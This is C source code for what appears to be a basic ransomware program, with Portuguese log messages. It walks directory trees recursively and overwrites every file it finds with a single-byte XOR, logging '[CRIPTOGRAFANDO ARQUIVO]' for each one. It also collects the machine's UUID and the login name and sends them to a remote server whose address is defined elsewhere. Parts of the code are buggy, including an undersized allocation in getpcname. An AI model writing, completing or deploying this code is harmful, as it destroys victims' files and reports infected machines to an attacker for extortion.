#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/stat.h>

#include "funcs.h"

struct dirent *getdir;

void WhatIsDir(char *dir_sch){
	//defined in /usr/include/bits/stat.h
	struct stat verify;

	DIR *dir;
	char file_path[1024];
	dir = opendir(dir_sch);

	if(!dir){
		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n",
						dir_sch);
		return;
	}
	
	while((getdir = readdir(dir))){

		if(strncmp(getdir->d_name,".", sizeof(getdir->d_name)) == 0 ||
				strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0)
					continue;

		sprintf(file_path , "%s%s", dir_sch, getdir->d_name);

		stat(file_path , &verify);
		strncat(file_path, "/", sizeof(file_path)-1);

		if(S_ISDIR(verify.st_mode)){
			printf("[ENTRANDO NO DIRETORIO]:  %s\n", file_path);
			WhatIsDir(file_path);

		} else {
			char file_name[1024] = {0};

			for(int i = 0; i < strlen(file_path) - 1; i++)
				file_name[i] = file_path[i];

			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", file_name);

			encryptfile(file_name);
		}
	}

	closedir(dir);
}


void connectserver(char *uuid, char *hostname){
	int sockfd;
	int status;

	printf("%s", uuid);

	struct sockaddr_in my_addr = {
		.sin_family = AF_INET,
		.sin_port = htons(myport),
		.sin_addr.s_addr = inet_addr(myhost),	
	};

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if(sockfd < 0)
		printf("[INFO]: Ocorreu um erro ao tentar criar o socket!");

	status = connect(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	if(status < 0)
		printf("[INFO]: Ocorreu um erro ao tentar se connectar ao servidor!");

	if( (send(sockfd, uuid, strlen(uuid), 0)) < 0)
		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");

	if( (send(sockfd, hostname, strlen(hostname), 0)) < 0)
		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");

}

void encryptfile(char *file_to_encrypt){
	//NOTE: the bin file must be one level
	//			above the directory tree of the target directory
	
	FILE *to_encrypt;
	char buff;
	int file_size;

	to_encrypt = fopen(file_to_encrypt, "r+");
	
	//viewing the file size
	fseek(to_encrypt, 0L, SEEK_END);
	file_size = ftell(to_encrypt);
	rewind(to_encrypt);

	//encrypting the file
	for(int i = 0; i <= file_size; i++) {
		char xor;
	
		buff = fgetc(to_encrypt);

		fseek(to_encrypt, ftell(to_encrypt) - 1, SEEK_SET);

		xor = buff ^ 'z';

		fputc(xor, to_encrypt);
	}
	
	fclose(to_encrypt);
}

char *getuuid(void){
	FILE *uuid;
	char id[140];
	char type[30];
	char *complete_id;

	complete_id = malloc(sizeof(char) * 160);

	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
	memcpy(&type, "product_uuid", sizeof(type));

	if(!uuid){

		memset(type, '\0', sizeof(type));
		memcpy(&type, "machine-id", sizeof(type));
		uuid = fopen("/etc/machine-id", "r");

		if(!uuid){

			memset(type, '\0', sizeof(type));
			memcpy(&type, "board_serial", sizeof(type));
			uuid = fopen("/sys/class/dmi/id/board_serial", "r");
		}
	}

	fgets(id, sizeof(id), uuid);
	
	sprintf(complete_id, "%s: %s", type, id);

	return complete_id;
	
}

char *getpcname(void){
	char hostname[60];
	char *name;

	name = (char *) malloc(sizeof(60 * sizeof(char)));

  getlogin_r(hostname, sizeof(hostname));

	sprintf(name, "Nome: %s\n", hostname);

	return name;
}
